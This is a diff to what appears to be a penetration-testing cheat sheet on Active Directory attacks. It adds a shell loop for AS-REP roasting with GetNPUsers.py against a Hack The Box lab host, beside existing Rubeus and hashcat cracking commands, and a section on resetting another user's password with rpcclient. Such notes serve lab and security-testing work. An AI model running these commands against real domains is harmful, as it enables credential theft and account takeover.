@@ -8,6 +8,12 @@
 ```
 impacket-GetNPUsers htb.local/ -usersfile user.txt -format hashcat -outputfile hashes.domain.txt
 
+or this:
+
+for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.192 blackfield.local/$user | grep krb5asrep; done
+
+
+
 .\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
 ```
 
@@ -25,5 +31,16 @@ sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /us
 ```
 
 
+### Password Reset over RPC
 
+https://room362.com/posts/2017/reset-ad-user-password-with-linux/
+
+```
+Log into Rpc with the user who can change password of other user:
+
+rpcclient $> setuserinfo2
+
+rpcclient $> setuserinfo2 audit2020 23 'Bwiz123!!!'
+
+```
 
